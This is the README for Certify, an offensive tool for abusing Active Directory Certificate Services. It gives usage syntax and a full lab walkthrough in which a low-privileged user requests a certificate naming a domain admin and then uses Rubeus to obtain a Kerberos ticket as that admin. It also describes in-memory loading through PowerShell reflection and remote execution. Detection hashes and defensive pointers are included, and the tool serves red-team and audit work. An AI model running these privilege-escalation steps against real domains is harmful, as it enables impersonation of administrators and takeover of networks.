# Certify

Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).

[@harmj0y](https://twitter.com/harmj0y) and [@tifkin_](https://twitter.com/tifkin_) are the primary authors of Certify and the the associated AD CS research ([blog](https://posts.specterops.io/certified-pre-owned-d95910965cd2) and [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)).

## Table of Contents
- [Certify](#certify)
  - [Usage](#usage)
    - [Using Requested Certificates](#using-requested-certificates)
  - [Example Walkthrough](#example-walkthrough)
  - [Defensive Considerations](#defensive-considerations)
  - [Compile Instructions](#compile-instructions)
    - [Sidenote: Running Certify Through PowerShell](#sidenote-running-certify-through-powershell)
      - [Sidenote Sidenote: Running Certify Over PSRemoting](#sidenote-sidenote-running-certify-over-psremoting)
  - [Reflections](#reflections)
  - [Acknowledgments](#acknowledgments)


## Usage

    C:\Tools>Certify.exe

       _____          _   _  __
      / ____|        | | (_)/ _|
     | |     ___ _ __| |_ _| |_ _   _
     | |    / _ \ '__| __| |  _| | | |
     | |___|  __/ |  | |_| | | | |_| |
      \_____\___|_|   \__|_|_|  \__, |
                                 __/ |
                                |___./
      v1.0.0


      Find information about all registered CAs:

        Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]


      Find all enabled certificate templates:

        Certify.exe find [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

      Find vulnerable/abusable certificate templates using default low-privileged groups:

        Certify.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

      Find vulnerable/abusable certificate templates using all groups the current user context is a part of:

        Certify.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

      Find enabled certificate templates where ENROLLEE_SUPPLIES_SUBJECT is enabled:

        Certify.exe find /enrolleeSuppliesSubject [/ca:SERVER\ca-name| /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

      Find enabled certificate templates capable of client authentication:

        Certify.exe find /clientauth [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

      Find all enabled certificate templates, display all of their permissions, and don't display the banner message:

        Certify.exe find /showAllPermissions /quiet [/ca:COMPUTER\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]

      Find all enabled certificate templates and output to a json file:

        Certify.exe find /json /outfile:C:\Temp\out.json [/ca:COMPUTER\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]


      Enumerate access control information for PKI objects:

        Certify.exe pkiobjects [/domain:domain.local] [/showAdmins] [/quiet]


      Request a new certificate using the current user context:

        Certify.exe request /ca:SERVER\ca-name [/subject:X] [/template:Y] [/install]

      Request a new certificate using the current machine context:

        Certify.exe request /ca:SERVER\ca-name /machine [/subject:X] [/template:Y] [/install]

      Request a new certificate using the current user context but for an alternate name (if supported):

        Certify.exe request /ca:SERVER\ca-name /template:Y /altname:USER

      Request a new certificate using the current user context but for an alternate name and SID (if supported):

        Certify.exe request /ca:SERVER\ca-name /template:Y /altname:USER /sid:S-1-5-21-2697957641-2271029196-387917394-2136

      Request a new certificate using the current user context but for an alternate name and URL (if supported):

        Certify.exe request /ca:SERVER\ca-name /template:Y /altname:USER /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-2697957641-2271029196-387917394-2136

      Request a new certificate on behalf of another user, using an enrollment agent certificate:

        Certify.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\Temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]


      Download an already requested certificate:

        Certify.exe download /ca:SERVER\ca-name /id:X [/install] [/machine]



    Certify completed in 00:00:00.0200190


### Using Requested Certificates

Certificates can be transformed to .pfx's usable with Certify with:

    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certificates can be used with Rubeus to request a TGT with:

    Rubeus.exe asktgt /user:X /certificate:C:\Temp\cert.pfx /password:<CERT_PASSWORD>


## Example Walkthrough

First, use Certify.exe to see if there are any vulnerable templates:

    C:\Temp>Certify.exe find /vulnerable
       _____          _   _  __
      / ____|        | | (_)/ _|
     | |     ___ _ __| |_ _| |_ _   _
     | |    / _ \ '__| __| |  _| | | |
     | |___|  __/ |  | |_| | | | |_| |
      \_____\___|_|   \__|_|_|  \__, |
                                 __/ |
                                |___./
      v1.0.0

    [*] Action: Find certificate templates
    [*] Using the search base 'CN=Configuration,DC=theshire,DC=local'
    [*] Restricting to CA name : dc.theshire.local\theshire-DC-CA

    [*] Listing info about the Enterprise CA 'theshire-DC-CA'

        Enterprise CA Name            : theshire-DC-CA
        DNS Hostname                  : dc.theshire.local
        FullName                      : dc.theshire.local\theshire-DC-CA
        Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
        Cert SubjectName              : CN=theshire-DC-CA, DC=theshire, DC=local
        Cert Thumbprint               : 187D81530E1ADBB6B8B9B961EAADC1F597E6D6A2
        Cert Serial                   : 14BFC25F2B6EEDA94404D5A5B0F33E21
        Cert Start Date               : 1/4/2021 10:48:02 AM
        Cert End Date                 : 1/4/2026 10:58:02 AM
        Cert Chain                    : CN=theshire-DC-CA,DC=theshire,DC=local
        UserSpecifiedSAN              : Disabled
        CA Permissions                :
          Owner: BUILTIN\Administrators        S-1-5-32-544

          Access Rights                                     Principal

          Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
          Allow  ManageCA, ManageCertificates               THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
          Allow  ManageCA, Read, Enroll                     THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
            [!] Low-privileged principal has ManageCA rights!
          Allow  Enroll                                     THESHIRE\Domain Computers     S-1-5-21-937929760-3187473010-80948926-515
          Allow  ManageCA, ManageCertificates               THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
          Allow  ManageCertificates, Enroll                 THESHIRE\certmanager          S-1-5-21-937929760-3187473010-80948926-1605
          Allow  ManageCA, Enroll                           THESHIRE\certadmin            S-1-5-21-937929760-3187473010-80948926-1606
        Enrollment Agent Restrictions :
          Everyone                      S-1-1-0
            Template : <All>
            Targets  :
              Everyone                  S-1-1-0

          Everyone                      S-1-1-0
            Template : User
            Targets  :
              Everyone                  S-1-1-0

    Vulnerable Certificates Templates :

        CA Name                         : dc.theshire.local\theshire-DC-CA
        Template Name                   : User2
        Validity Period                 : 2 years
        Renewal Period                  : 6 weeks
        msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
        mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PEND_ALL_REQUESTS, PUBLISH_TO_DS, AUTO_ENROLLMENT
        Authorized Signatures Required  : 0
        pkiextendedkeyusage             : Client Authentication, Smart Card Logon
        Permissions
          Enrollment Permissions
            Enrollment Rights           : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
            All Extended Rights         : THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
          Object Control Permissions
            Owner                       : THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000
            Full Control Principals     : THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
            WriteOwner Principals       : NT AUTHORITY\Authenticated UsersS-1-5-11
                                          THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
                                          THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
            WriteDacl Principals        : NT AUTHORITY\Authenticated UsersS-1-5-11
                                          THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
                                          THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
            WriteProperty Principals    : NT AUTHORITY\Authenticated UsersS-1-5-11
                                          THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
                                          THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519

        CA Name                         : dc.theshire.local\theshire-DC-CA
        Template Name                   : VulnTemplate
        Validity Period                 : 3 years
        Renewal Period                  : 6 weeks
        msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT
        mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
        Authorized Signatures Required  : 0
        pkiextendedkeyusage             : Client Authentication, Encrypting File System, Secure Email
        Permissions
          Enrollment Permissions
            Enrollment Rights           : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
                                          THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513
                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
          Object Control Permissions
            Owner                       : THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000
            WriteOwner Principals       : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
                                          THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000
            WriteDacl Principals        : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
                                          THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000
            WriteProperty Principals    : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512
                                          THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519
                                          THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000



    Certify completed in 00:00:00.6548319

Given the above results, we have the three following issues:

1. `THESHIRE\Domain Users` have **ManageCA** permissions over the `dc.theshire.local\theshire-DC-CA` CA (ESC7)
   * This means that the EDITF_ATTRIBUTESUBJECTALTNAME2 flag can be flipped on the CA by anyone.
2. `THESHIRE\Domain Users` have full control over the **User2** template (ESC4)
   * This means that anyone can flip the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag on this template and remove the **PEND_ALL_REQUESTS** issuance requirement.
3. `THESHIRE\Domain Users` can enroll in the **VulnTemplate** template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set (ESC1)
   * This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA).

We'll show the abuse of scenario 3.

Next, let's request a new certificate for this template/CA, specifying a DA `localadmin` as the alternate principal:

    C:\Temp>Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin

       _____          _   _  __
      / ____|        | | (_)/ _|
     | |     ___ _ __| |_ _| |_ _   _
     | |    / _ \ '__| __| |  _| | | |
     | |___|  __/ |  | |_| | | | |_| |
      \_____\___|_|   \__|_|_|  \__, |
                                 __/ |
                                |___./
      v1.0.0

    [*] Action: Request a Certificates

    [*] Current user context    : THESHIRE\harmj0y
    [*] No subject name specified, using current context as subject.

    [*] Template                : VulnTemplate
    [*] Subject                 : CN=harmj0y, OU=TestOU, DC=theshire, DC=local
    [*] AltName                 : localadmin

    [*] Certificate Authority   : dc.theshire.local\theshire-DC-CA

    [*] CA Response             : The certificate had been issued.
    [*] Request ID              : 337

    [*] cert.pem         :

    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAn8bKuwCYj8...
    -----END RSA PRIVATE KEY-----
    -----BEGIN CERTIFICATE-----
    MIIGITCCBQmgAwIBAgITVQAAAV...
    -----END CERTIFICATE-----


    [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



    Certify completed in 00:00:04.2127911


Copy the ` -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----` section to a file on Linux/macOS, and run the openssl command to convert it to a .pfx. When prompted, don't enter a password:

    (base) laptop:~ harmj0y$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    Enter Export Password:
    Verifying - Enter Export Password:
    (base) laptop:~ harmj0y$


Finally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the `altname` user using Rubeus:

    C:\Temp>Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\cert.pfx

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.6.1

    [*] Action: Ask TGT

    [*] Using PKINIT with etype rc4_hmac and subject: CN=harmj0y, OU=TestOU, DC=theshire, DC=local
    [*] Building AS-REQ (w/ PKINIT preauth) for: 'theshire.local\localadmin'
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

          doIFujCCBbagAwIBBaEDAgEWooIExzCC...(snip)...

      ServiceName           :  krbtgt/theshire.local
      ServiceRealm          :  THESHIRE.LOCAL
      UserName              :  localadmin
      UserRealm             :  THESHIRE.LOCAL
      StartTime             :  2/22/2021 2:06:51 PM
      EndTime               :  2/22/2021 3:06:51 PM
      RenewTill             :  3/1/2021 2:06:51 PM
      Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
      KeyType               :  rc4_hmac
      Base64(key)           :  Etb5WPFWeMbsZr2+FQQQMw==


## Defensive Considerations

Certify was released at Black Hat 2021 with our ["Certified Pre-Owned: Abusing Active Directory Certificate Services"](https://www.blackhat.com/us-21/briefings/schedule/#certified-pre-owned-abusing-active-directory-certificate-services-23168) talk.

The [TypeRefHash](https://www.gdatasoftware.com/blog/2020/06/36164-introducing-the-typerefhash-trh) of the current Certify codebase is **f9dbbfe2527e1164319350c0b0900c58be57a46c53ffef31699ed116a765995a**.

The TypeLib GUID of Certify is **64524ca5-e4d0-41b3-acc3-3bdbefd40c97**. This is reflected in the Yara rules currently in this repo.

See our [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) for prevention and detection guidance.


## Compile Instructions

We are not planning on releasing binaries for Certify, so you will have to compile yourself :)

Certify has been built against .NET 4.0 and is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Simply open up the project .sln, choose "Release", and build.


### Sidenote: Running Certify Through PowerShell

If you want to run Certify in-memory through a PowerShell wrapper, first compile the Certify and base64-encode the resulting assembly:

    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt

Certify can then be loaded in a PowerShell script with the following (where "aa..." is replaced with the base64-encoded Certify assembly string):

    $CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))

The Main() method and any arguments can then be invoked as follows:

    [Certify.Program]::Main("find /vulnerable".Split())


#### Sidenote Sidenote: Running Certify Over PSRemoting

Due to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, Certify has a function to help with that.

If you follow the instructions in [Sidenote: Running Certify Through PowerShell](#sidenote-running-Certify-through-powershell) to create a Certify.ps1, append something like the following to the script:

    [Certify.Program]::MainString("find /vulnerable")

You should then be able to run Certify over PSRemoting with something like the following:

    $s = New-PSSession dc.theshire.local
    Invoke-Command -Session $s -FilePath C:\Temp\Certify.ps1

Alternatively, Certify's `/outfile:C:\FILE.txt` argument will redirect all output streams to the specified file.


## Reflections

On the subject of public disclosure, we self-embargoed the release of our offensive tooling (Certify as well as [ForgeCert](https://github.com/GhostPack/ForgeCert)) for ~45 days after we published our [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) in order to give organizations a chance to get a grip on the issues surrounding Active Directory Certificate Services. We also preemptively released some Yara rules/IOCs for both projects and released the defensive-focused [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) PowerShell project along with the whitepaper. However, we have found that organizations and vendors have historically often not fixed issues or built detections for "theoretical" attacks until someone proves something is possible with a proof of concept.


## Acknowledgments

Certify used a few resources found online as reference and inspiration:

* [This post](https://web.archive.org/web/20200131060008/http://geekswithblogs.net/shaunxu/archive/2012/01/13/working-with-active-directory-certificate-service-via-c.aspx) on requesting certificates from C#.
* [This gist](https://gist.github.com/jimmyca15/8f737f5f0bcf347450bd6d6bf34f4f7e#file-certificate-cs-L86-L101) for SAN specification.
* [This StackOverflow post](https://stackoverflow.com/a/23739932) on exporting private keys.
* [This PKISolutions post](https://www.sysadmins.lv/blog-en/how-to-convert-pkiexirationperiod-and-pkioverlapperiod-active-directory-attributes.aspx) on converting pkiExpirationPeriod.
* [This section of MS-CSRA](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csra/b497b1e1-a84c-40c8-9379-524193176fad) describing enrollment agent security DACLs.


The AD CS work was built on work from a number of others. The [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) has a complete treatment, but to summarize:

* [Benjamin Delpy](https://twitter.com/gentilkiwi/) for his [extensive work](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) on smart cards/certificates with Mimikatz and Kekeo.
* PKI Solutions for their [excellent posts on PKI in Active Directory](https://www.pkisolutions.com/thepkiblog/), as well as their [PSPKI PowerShell module](https://github.com/PKISolutions/PSPKI), which our auditing toolkit is based on.
* The "[Windows Server 2008 – PKI and Certificate Security](https://www.microsoftpressstore.com/store/windows-server-2008-pki-and-certificate-security-9780735640788)" book by Brian Komar.
* The following open technical specifications provided by Microsoft:
  * [MS-CERSOD]: Certificate Services Protocols Overview
  * [MS-CRTD]: Certificate Templates Structure
  * [MS-CSRA]: Certificate Services Remote Administration Protocol
  * [MS-ICPR]: ICertPassage Remote Protocol
  * [MS-WCCE]: Windows Client Certificate Enrollment Protocol
* [Christoph Falta's GitHub repo](https://github.com/cfalta/PoshADCS) which covers some details on attacking certificate templates, including virtual smart cards as well as some ideas on ACL based abuses.
* CQURE's "[The tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)" post which covers some Subject Alternative Name abuses.
* Keyfactor's 2016 post "[Hidden Dangers: Certificate Subject Alternative Names (SANs)](https://www.keyfactor.com/blog/hidden-dangers-certificate-subject-alternative-names-sans/)"
* [@Elkement](https://twitter.com/elkement)'s posts "[Sizzle @ hackthebox – Unintended: Getting a Logon Smartcard for the Domain Admin!](https://elkement.blog/2019/06/01/sizzle-hackthebox-unintended-getting-a-logon-smartcard-for-the-domain-admin-2/)" and "[Impersonating a Windows Enterprise Admin with a Certificate: Kerberos PKINIT from Linux](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/)" detail certificate template misconfigurations.
* Carl Sörqvist wrote up a detailed, and plausible, scenario for how some of these misconfigurations happen titled "[Supply in the Request Shenanigans](https://blog.qdsecurity.se/2020/09/04/supply-in-the-request-shenanigans/)".
* [Ceri Coburn](https://twitter.com/_ethicalchaos_) released an excellent post in 2020 on "[Attacking Smart Card Based Active Directory Networks](https://ethicalchaos.dev/2020/10/04/attacking-smart-card-based-active-directory-networks/)" detailing some smart card abuse and Certify additions.
* Brad Hill published a whitepaper titled "[Weaknesses and Best Practices of Public Key Kerberos with Smart Cards](https://research.nccgroup.com/wp-content/uploads/2020/07/weaknesses_and_best_practices_of_public_key_kerberos_with_smart_cards.pdf)" which provided some good background on Kerberos/PKINIT from a security perspective.

